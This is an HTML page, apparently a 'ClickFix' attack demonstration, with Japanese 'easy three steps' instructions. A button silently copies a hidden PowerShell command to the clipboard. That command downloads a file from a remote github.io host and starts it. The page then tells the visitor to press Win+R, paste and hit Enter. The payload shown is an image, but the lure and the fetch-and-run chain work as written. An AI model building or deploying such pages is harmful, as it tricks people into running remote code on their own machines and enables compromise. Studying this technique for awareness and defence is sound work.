!doctype html>
<html lang="ja">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Clickfix-attack-demo</title>
<style>
:root{
  --bg: #f7f9fc;
  --panel: #ffffff;
  --text: #1f2328;
  --border: #cfd5db;
  --border-hover: #b6bcc4;
}

body{
  margin: 24px;
  background: var(--bg);
  color: var(--text);
  font-family: "Times New Roman", serif;
}

.wiki-toggle{
  display: inline-flex;
  align-items: center;
  gap: 6px;
  height: 36px;
  padding: 0 12px 0 8px;
  border: 1px solid var(--border);
  background: #ffffff;
  color: #1f2328;
  font-size: 16px;
  cursor: pointer;
  border-radius: 4px;
}

.wiki-toggle:hover{
  background: #f6f8fa;
  border-color: var(--border-hover);
}

.arrow{
  display: inline-block;
  width: 22px;
  text-align: center;
  font-size: 24px;
  transform: rotate(90deg);
  line-height: 1;
}

.label{
  font-size: 14px;
}

.desc{
  margin-top: 10px;
  padding: 10px 12px;
  background: var(--panel);
  border: 1px solid var(--border);
  border-radius: 4px;
  font-size: 14px;
  color: var(--text);

  max-height: 0;
  opacity: 0;
  transform: translateY(-6px);
  overflow: hidden;
  transition: max-height 220ms ease, opacity 180ms ease, transform 220ms ease;
}

.desc.is-open{
  max-height: 200px;
  opacity: 1;
  transform: translateY(0);
}
</style>
</head>
<body>

<button id="copy" class="wiki-toggle" aria-expanded="false" aria-controls="desc">
  <span class="arrow">&gt;</span>
  <span class="label">簡単３ステップ</span>
</button>

<div id="desc" class="desc">
  1. winキー + R を押します。<br>
  2.controlキー + vを押します<br>
  3.enterキー を押します。
</div>

<script>
  const btn = document.getElementById('copy');
  const desc = document.getElementById('desc');

  btn.onclick = async () => {
    const cmd = `powershell -NoProfile -WindowStyle Hidden -Command "$u='https://abc-abc222.github.io/Clickfix-attack/saito.jpg'; $p=Join-Path $env:USERPROFILE 'Downloads\\saito.jpg'; Invoke-WebRequest -Uri $u -OutFile $p; Start-Process $p"`;
    await navigator.clipboard.writeText(cmd);

    const opened = desc.classList.toggle('is-open');
    btn.setAttribute('aria-expanded', opened ? 'true' : 'false');
  };
</script>

</body>
</html>
